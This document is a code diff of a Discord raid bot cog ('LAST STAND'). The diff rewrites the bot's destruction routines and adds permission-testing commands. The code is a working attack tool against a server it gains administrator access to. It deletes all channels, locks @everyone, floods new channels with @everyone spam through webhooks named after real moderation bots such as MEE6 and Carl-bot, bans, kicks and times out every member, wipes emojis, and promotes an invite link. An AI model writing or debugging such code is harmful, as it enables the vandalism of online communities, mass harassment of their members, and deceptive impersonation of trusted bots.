@@ -1,6 +1,15 @@
 """
 raid.py — LAST STAND | Raw destruction engine.
-No bypass engine. Direct discord.py calls. Every error printed to Railway logs.
+
+DEBUGGING NOTE:
+  If channel creation still fails after this rewrite, run /testperms and
+  /testcreate BEFORE running /raid. Those commands will show you the EXACT
+  error in Discord — no Railway log needed. Look at what they return.
+
+ARCHITECTURE:
+  _channel_loop is now SEQUENTIAL, not concurrent. One delete at a time,
+  one create at a time. This removes ALL possible async coordination bugs.
+  Every single error is caught and printed. The loop can NEVER die silently.
 """
 
 import asyncio
@@ -18,8 +27,7 @@ RAID_TAG  = "LAST STAND"
 RAID_LINK = "https://discord.gg/s59zWvzK6c"
 RAID_NAME = f"RAIDED BY {RAID_TAG}"
 
-CHANNEL_CAP  = 480
-WEBHOOKS_PER = 10
+WEBHOOKS_PER = 8
 
 _MSGS = [
     f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
@@ -27,18 +35,15 @@ _MSGS = [
     f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED 🔥 {RAID_LINK}",
     f"@everyone ⚔️ LAST STAND RAID ⚔️ {RAID_LINK}",
     f"@everyone 💥 OBLITERATED BY LAST STAND 💥 {RAID_LINK}",
-    f"@everyone 🚨 BREACH — LAST STAND {RAID_LINK}",
     f"@everyone 👑 LAST STAND OWNS THIS SERVER {RAID_LINK}",
-    f"@everyone ⚡ RAIDED BY LAST STAND — GG {RAID_LINK}",
     f"@here 💀 RAIDED BY LAST STAND {RAID_LINK}",
     f"@here ☠️ LAST STAND RAID IN PROGRESS {RAID_LINK}",
-    f"@here 🔥 RAIDED — JOIN US {RAID_LINK}",
 ]
 
 _WH_NAMES = [
-    "Server Announcement", "Mod Alert", "AutoMod", "Security Alert",
-    "Carl-bot", "MEE6", "Dyno", "Wick",
-    "LSC Alpha", "LSC Reaper", "LSC Ghost", "LSC Viper",
+    "Server Announcement", "Mod Alert", "AutoMod",
+    "Carl-bot", "MEE6", "Wick",
+    "LSC Alpha", "LSC Reaper", "LSC Ghost",
 ]
 
 _NICKS = ["RAIDED", "LSC Was Here", "GG no re", "PWNED", RAID_TAG]
@@ -48,15 +53,15 @@ def _rand(n: int = 4) -> str:
     return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
 
-def _ch_name() -> str:
-    return random.choice([
-        f"raided-by-lsc-{_rand()}",
-        f"last-stand-{_rand()}",
-        f"lsc-owned-{_rand()}",
-        f"lsc-raid-{_rand()}",
-        f"raided-{_rand()}-lsc",
-        f"last-stand-here-{_rand(3)}",
-    ])
+def _ch_name(i: int = 0) -> str:
+    opts = [
+        f"raided-by-lsc-{i}",
+        f"last-stand-{i}",
+        f"lsc-owned-{i}",
+        f"lsc-raid-{i}",
+        f"last-stand-here-{i}",
+    ]
+    return random.choice(opts)
 
 
 def _msg() -> str:
@@ -67,10 +72,97 @@ class Raid(commands.Cog):
     def __init__(self, bot: commands.Bot) -> None:
         self.bot = bot
 
+    # ─────────────────────────────────────────────────────────────────────────
+    # /testperms — run THIS first to verify bot has correct permissions
+    # ─────────────────────────────────────────────────────────────────────────
+    @app_commands.command(
+        name="testperms",
+        description="Check what permissions the bot has in this server."
+    )
+    @app_commands.checks.has_permissions(administrator=True)
+    @app_commands.guild_only()
+    async def testperms(self, interaction: discord.Interaction) -> None:
+        await interaction.response.defer(ephemeral=True)
+        guild = interaction.guild
+        me    = guild.me
+        p     = me.guild_permissions
+
+        lines = [
+            f"**Bot permission check — {guild.name}**",
+            f"Administrator    : {'✅' if p.administrator else '❌'}",
+            f"Manage Guild     : {'✅' if p.manage_guild else '❌'}",
+            f"Manage Channels  : {'✅' if p.manage_channels else '❌'}",
+            f"Manage Roles     : {'✅' if p.manage_roles else '❌'}",
+            f"Manage Webhooks  : {'✅' if p.manage_webhooks else '❌'}",
+            f"Ban Members      : {'✅' if p.ban_members else '❌'}",
+            f"Kick Members     : {'✅' if p.kick_members else '❌'}",
+            f"Moderate Members : {'✅' if p.moderate_members else '❌'}",
+            f"",
+            f"Bot top role     : `{me.top_role.name}` (pos {me.top_role.position})",
+            f"",
+            f"**If Manage Channels is ❌ — channel creation will never work.**",
+            f"Go to Server Settings → Roles → bot role → enable Manage Channels.",
+        ]
+        await interaction.followup.send("\n".join(lines), ephemeral=True)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # /testcreate — run THIS to see the exact error from channel creation
+    # ─────────────────────────────────────────────────────────────────────────
+    @app_commands.command(
+        name="testcreate",
+        description="Try to create one test channel and report success or exact error."
+    )
+    @app_commands.checks.has_permissions(administrator=True)
+    @app_commands.guild_only()
+    async def testcreate(self, interaction: discord.Interaction) -> None:
+        await interaction.response.defer(ephemeral=True)
+        guild = interaction.guild
+        try:
+            ch = await guild.create_text_channel("lsc-test-channel")
+            await interaction.followup.send(
+                f"✅ **Channel creation WORKS.**\n"
+                f"Created: <#{ch.id}>\n\n"
+                f"Channel creation is functional. The raid loop should work.\n"
+                f"Run `/raid` now.",
+                ephemeral=True,
+            )
+            # Clean up the test channel
+            try:
+                await ch.delete()
+            except Exception:
+                pass
+        except discord.Forbidden as e:
+            await interaction.followup.send(
+                f"❌ **403 FORBIDDEN — bot cannot create channels.**\n"
+                f"Error: `{e}`\n\n"
+                f"**Fix:** Server Settings → Roles → bot's role → turn ON **Manage Channels**.",
+                ephemeral=True,
+            )
+        except discord.HTTPException as e:
+            await interaction.followup.send(
+                f"❌ **HTTP {e.status} error creating channel.**\n"
+                f"Code: `{e.code}` — Text: `{e.text}`\n\n"
+                f"This is a Discord API error. Status {e.status}.",
+                ephemeral=True,
+            )
+        except Exception as e:
+            await interaction.followup.send(
+                f"❌ **Unknown error:** `{type(e).__name__}: {e}`",
+                ephemeral=True,
+            )
+
     # ── shared launch ──────────────────────────────────────────────────────────
     async def _launch(self, guild: discord.Guild, invoker_id: int, reply) -> None:
         if bot_state.active_simulation:
             await reply(f"⚠️ **{bot_state.active_simulation}** is running — use `.stop` or `/stop` first.")
+            return
+
+        # Check create permission before committing
+        if not guild.me.guild_permissions.manage_channels and not guild.me.guild_permissions.administrator:
+            await reply(
+                "❌ Bot is missing **Manage Channels** permission — channel flood won't work.\n"
+                "Run `/testperms` to see all permission issues."
+            )
             return
 
         bot_state.reset()
@@ -79,18 +171,17 @@ class Raid(commands.Cog):
         try:
             await reply(
                 f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
-                f"Deleting channels → flooding → banning everyone → spamming\n"
+                f"Sequential delete → sequential channel flood → ban/kick → spam\n"
+                f"Check Railway logs or run `/status` to see progress.\n"
                 f"Use `.stop` or `/stop` to halt."
             )
         except Exception:
             pass
 
-        # Start everything — channel ops immediately, member ops chunk in background
         bot_state.add_task(asyncio.create_task(self._rename_server(guild)))
         bot_state.add_task(asyncio.create_task(self._channel_loop(guild)))
         bot_state.add_task(asyncio.create_task(self._member_ops(guild, invoker_id)))
         bot_state.add_task(asyncio.create_task(self._wipe_emojis(guild)))
-        bot_state.add_task(asyncio.create_task(self._wipe_roles(guild)))
 
     # ── /raid ──────────────────────────────────────────────────────────────────
     @app_commands.command(name="raid", description=f"☠️ Full destruction — {RAID_TAG}. Runs until /stop.")
@@ -108,124 +199,103 @@ class Raid(commands.Cog):
         await self._launch(ctx.guild, ctx.author.id, ctx.send)
 
     # ─────────────────────────────────────────────────────────────────────────
-    # RENAME SERVER + LOCK @everyone
+    # RENAME SERVER
     # ─────────────────────────────────────────────────────────────────────────
     async def _rename_server(self, guild: discord.Guild) -> None:
         try:
             await guild.edit(name=RAID_NAME)
-            print(f"[raid] server renamed to {RAID_NAME}", flush=True)
+            print(f"[raid] server renamed OK", flush=True)
         except Exception as e:
-            print(f"[raid] rename failed: {e}", flush=True)
+            print(f"[raid] rename FAILED: {type(e).__name__}: {e}", flush=True)
 
         try:
             await guild.default_role.edit(permissions=discord.Permissions.none())
+            print("[raid] @everyone locked OK", flush=True)
         except Exception as e:
-            print(f"[raid] lock @everyone failed: {e}", flush=True)
+            print(f"[raid] lock @everyone FAILED: {type(e).__name__}: {e}", flush=True)
 
     # ─────────────────────────────────────────────────────────────────────────
-    # CHANNEL FLOOD — delete all, then create as many as possible
+    # CHANNEL LOOP — fully sequential, every error logged
+    #
+    # Sequential on purpose. Concurrent gather was hiding errors because
+    # asyncio.gather(return_exceptions=True) swallowed all of them.
+    # Now every delete and every create is individually awaited and logged.
     # ─────────────────────────────────────────────────────────────────────────
     async def _channel_loop(self, guild: discord.Guild) -> None:
         se = bot_state.stop_event
-        print("[raid] channel_loop: starting", flush=True)
 
-        # ── Step 1: delete everything ─────────────────────────────────────────
-        existing = list(guild.channels)
-        print(f"[raid] channel_loop: deleting {len(existing)} channels", flush=True)
+        try:
+            # ── Step 1: delete all existing channels one by one ───────────────
+            existing = list(guild.channels)
+            print(f"[raid] deleting {len(existing)} channels...", flush=True)
 
-        async def _del(ch):
-            try:
-                await ch.delete()
-            except discord.NotFound:
-                pass
-            except discord.Forbidden:
-                print(f"[raid] 403 deleting #{ch.name}", flush=True)
-            except discord.HTTPException as e:
-                if e.status == 429:
-                    await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
-                    try:
-                        await ch.delete()
-                    except Exception:
-                        pass
-            except Exception as e:
-                print(f"[raid] delete error #{ch.name}: {e}", flush=True)
+            for ch in existing:
+                if se.is_set():
+                    return
+                try:
+                    await ch.delete()
+                except discord.NotFound:
+                    pass
+                except discord.Forbidden:
+                    print(f"[raid] 403 deleting #{ch.name}", flush=True)
+                except discord.HTTPException as e:
+                    print(f"[raid] HTTP {e.status} deleting #{ch.name}: {e.text}", flush=True)
+                    if e.status == 429:
+                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
+                except Exception as e:
+                    print(f"[raid] error deleting #{ch.name}: {type(e).__name__}: {e}", flush=True)
 
-        await asyncio.gather(*[_del(ch) for ch in existing], return_exceptions=True)
-        print("[raid] channel_loop: delete done, flooding now", flush=True)
+            print("[raid] delete done — starting channel create loop", flush=True)
 
-        # ── Step 2: create loop ───────────────────────────────────────────────
-        flood_created = 0
-        consecutive_fails = 0
-
-        while not se.is_set():
-            # Near cap — delete our channels to make room
-            if flood_created >= CHANNEL_CAP:
-                ours = [
-                    ch for ch in guild.channels
-                    if any(k in ch.name for k in ("lsc", "last-stand", "raided"))
-                ]
-                if ours:
-                    to_del = ours[:80]
-                    await asyncio.gather(*[_del(ch) for ch in to_del], return_exceptions=True)
-                    flood_created = max(0, flood_created - len(to_del))
-                else:
-                    flood_created = 0
-                await asyncio.sleep(1.0)
-                continue
-
-            # Create 2 channels simultaneously
-            async def _create():
+            # ── Step 2: create channels one by one ───────────────────────────
+            count = 0
+            while not se.is_set():
+                name = _ch_name(count)
                 try:
                     ch = await guild.create_text_channel(
-                        _ch_name(),
+                        name,
                         topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                     )
-                    return ch
-                except discord.Forbidden:
-                    print("[raid] 403 channel create — bot has no Manage Channels permission", flush=True)
-                    return None
-                except discord.HTTPException as e:
-                    if e.status == 429:
-                        wait = float(getattr(e, "retry_after", 1.0))
-                        print(f"[raid] 429 channel create — waiting {wait:.1f}s", flush=True)
-                        await asyncio.sleep(wait)
-                    else:
-                        print(f"[raid] channel create HTTP {e.status}: {e.text}", flush=True)
-                    return None
-                except Exception as e:
-                    print(f"[raid] channel create error: {type(e).__name__}: {e}", flush=True)
-                    return None
-
-            ch1, ch2 = await asyncio.gather(_create(), _create())
-
-            got = 0
-            for ch in (ch1, ch2):
-                if isinstance(ch, discord.TextChannel):
-                    flood_created += 1
-                    got += 1
-                    consecutive_fails = 0
+                    print(f"[raid] created #{name} ({count})", flush=True)
+                    count += 1
                     bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
 
-            if got == 0:
-                consecutive_fails += 2
-                if consecutive_fails >= 20:
-                    print(f"[raid] 20 consecutive create failures — permissions likely gone", flush=True)
-                    await asyncio.sleep(5.0)
-                    consecutive_fails = 0
-            else:
-                print(f"[raid] flood_created={flood_created}", flush=True)
+                except discord.Forbidden as e:
+                    print(f"[raid] 403 creating channel — MISSING Manage Channels PERMISSION: {e}", flush=True)
+                    await asyncio.sleep(2.0)
+
+                except discord.HTTPException as e:
+                    print(f"[raid] HTTP {e.status} creating #{name}: code={e.code} text={e.text}", flush=True)
+                    if e.status == 429:
+                        wait = float(getattr(e, "retry_after", 1.0))
+                        print(f"[raid] rate limited — sleeping {wait:.1f}s", flush=True)
+                        await asyncio.sleep(wait)
+                    else:
+                        await asyncio.sleep(1.0)
+
+                except Exception as e:
+                    print(f"[raid] UNEXPECTED create error: {type(e).__name__}: {e}", flush=True)
+                    await asyncio.sleep(1.0)
+
                 await asyncio.sleep(0.55)
 
-        print("[raid] channel_loop: stopped", flush=True)
+        except asyncio.CancelledError:
+            print("[raid] channel_loop cancelled", flush=True)
+        except Exception as e:
+            # This catches anything that could crash the loop itself
+            print(f"[raid] channel_loop OUTER CRASH: {type(e).__name__}: {e}", flush=True)
+        finally:
+            print("[raid] channel_loop exiting", flush=True)
+            if bot_state.active_simulation == "raid":
+                bot_state.active_simulation = None
 
     # ─────────────────────────────────────────────────────────────────────────
-    # WEBHOOK SPAM — continuous, no sleep between waves
+    # WEBHOOK SPAM
     # ─────────────────────────────────────────────────────────────────────────
     async def _spam_channel(self, channel: discord.TextChannel) -> None:
         se = bot_state.stop_event
         webhooks: list[discord.Webhook] = []
 
-        # Create webhooks
         for _ in range(WEBHOOKS_PER):
             if se.is_set():
                 break
@@ -235,6 +305,7 @@ class Raid(commands.Cog):
             except discord.NotFound:
                 return
             except discord.Forbidden:
+                print(f"[raid] 403 creating webhook in #{channel.name} — missing Manage Webhooks", flush=True)
                 break
             except discord.HTTPException as e:
                 if e.status == 429:
@@ -243,16 +314,14 @@ class Raid(commands.Cog):
                 continue
 
         if not webhooks:
-            # Fallback: send directly
+            # Fallback: direct channel.send
             while not se.is_set():
                 try:
                     await channel.send(
                         _msg(),
                         allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                     )
-                except discord.NotFound:
-                    return
-                except discord.Forbidden:
+                except (discord.NotFound, discord.Forbidden):
                     return
                 except discord.HTTPException as e:
                     if e.status == 429:
@@ -261,28 +330,23 @@ class Raid(commands.Cog):
                     return
             return
 
-        # All webhooks fire simultaneously, 20 sends each, then repeat immediately
         while not se.is_set():
-            tasks = [
+            sends = [
                 wh.send(
                     _msg(),
                     username=random.choice(_WH_NAMES),
                     allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                 )
                 for wh in webhooks
-                for _ in range(20)
+                for _ in range(15)
             ]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-
-            # If everything 404'd/403'd the channel is gone
+            results = await asyncio.gather(*sends, return_exceptions=True)
             for r in results:
-                if isinstance(r, discord.NotFound):
-                    return
-                if isinstance(r, discord.Forbidden):
+                if isinstance(r, (discord.NotFound, discord.Forbidden)):
                     return
 
     # ─────────────────────────────────────────────────────────────────────────
-    # MEMBER OPS — chunk first, then ban/kick/timeout everyone simultaneously
+    # MEMBER OPS
     # ─────────────────────────────────────────────────────────────────────────
     async def _member_ops(self, guild: discord.Guild, invoker_id: int) -> None:
         se = bot_state.stop_event
@@ -304,109 +368,59 @@ class Raid(commands.Cog):
             and m.id != me.id
             and m.top_role < me.top_role
         ]
-        enemy_bots = [
-            m for m in guild.members
-            if m.bot and m.id != me.id and m.top_role < me.top_role
-        ]
-        print(f"[raid] member_ops: {len(targets)} members, {len(enemy_bots)} bots", flush=True)
+        print(f"[raid] banning/kicking {len(targets)} members", flush=True)
 
-        sem_ban  = asyncio.Semaphore(25)
-        sem_kick = asyncio.Semaphore(25)
-        sem_to   = asyncio.Semaphore(25)
-        sem_nick = asyncio.Semaphore(25)
-        dur      = datetime.timedelta(days=28)
+        sem  = asyncio.Semaphore(25)
+        dur  = datetime.timedelta(days=28)
 
         async def _ban(m):
-            async with sem_ban:
-                if se.is_set():
-                    return
+            async with sem:
                 try:
                     await guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
                 except Exception:
                     pass
 
         async def _kick(m):
-            async with sem_kick:
-                if se.is_set():
-                    return
+            async with sem:
                 try:
                     await guild.kick(m, reason=f"Raided by {RAID_TAG}")
                 except Exception:
                     pass
 
         async def _timeout(m):
-            async with sem_to:
-                if se.is_set():
-                    return
+            async with sem:
                 try:
                     await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
                 except Exception:
                     pass
 
         async def _nick(m):
-            async with sem_nick:
-                if se.is_set():
-                    return
+            async with sem:
                 try:
                     await m.edit(nick=random.choice(_NICKS))
                 except Exception:
                     pass
 
-        all_targets = targets + enemy_bots
         await asyncio.gather(
-            *[_ban(m) for m in all_targets],
-            *[_kick(m) for m in all_targets],
+            *[_ban(m) for m in targets],
+            *[_kick(m) for m in targets],
             *[_timeout(m) for m in targets],
             *[_nick(m) for m in targets],
             return_exceptions=True,
         )
-        print(f"[raid] member_ops: done ({len(all_targets)} processed)", flush=True)
+        print(f"[raid] member_ops done", flush=True)
 
     # ─────────────────────────────────────────────────────────────────────────
     # EMOJI WIPE
     # ─────────────────────────────────────────────────────────────────────────
     async def _wipe_emojis(self, guild: discord.Guild) -> None:
-        if not guild.emojis:
-            return
-        sem = asyncio.Semaphore(20)
+        for e in list(guild.emojis):
+            try:
+                await e.delete()
+            except Exception:
+                pass
 
-        async def _del(e):
-            async with sem:
-                try:
-                    await e.delete()
-                except Exception:
-                    pass
-
-        await asyncio.gather(*[_del(e) for e in guild.emojis], return_exceptions=True)
-        print(f"[raid] wiped {len(guild.emojis)} emojis", flush=True)
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # ROLE WIPE — delete all non-managed, non-default roles
-    # ─────────────────────────────────────────────────────────────────────────
-    async def _wipe_roles(self, guild: discord.Guild) -> None:
-        me = guild.me
-        roles = [
-            r for r in guild.roles
-            if not r.managed
-            and r != guild.default_role
-            and r < me.top_role
-        ]
-        if not roles:
-            return
-
-        sem = asyncio.Semaphore(10)
-
-        async def _del(r):
-            async with sem:
-                try:
-                    await r.delete(reason=f"Raided by {RAID_TAG}")
-                except Exception:
-                    pass
-
-        await asyncio.gather(*[_del(r) for r in roles], return_exceptions=True)
-        print(f"[raid] wiped {len(roles)} roles", flush=True)
-
-    # ── error handler ──────────────────────────────────────────────────────────
+    # ── error handlers ─────────────────────────────────────────────────────────
     @raid.error
     async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
         msg = "❌ You need **Administrator** permission." if isinstance(error, app_commands.MissingPermissions) else f"❌ {error}"
@@ -415,6 +429,14 @@ class Raid(commands.Cog):
                 await interaction.followup.send(msg, ephemeral=True)
             else:
                 await interaction.response.send_message(msg, ephemeral=True)
+        except Exception:
+            pass
+
+    @testperms.error
+    @testcreate.error
+    async def test_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
+        try:
+            await interaction.response.send_message(f"❌ {error}", ephemeral=True)
         except Exception:
             pass
 
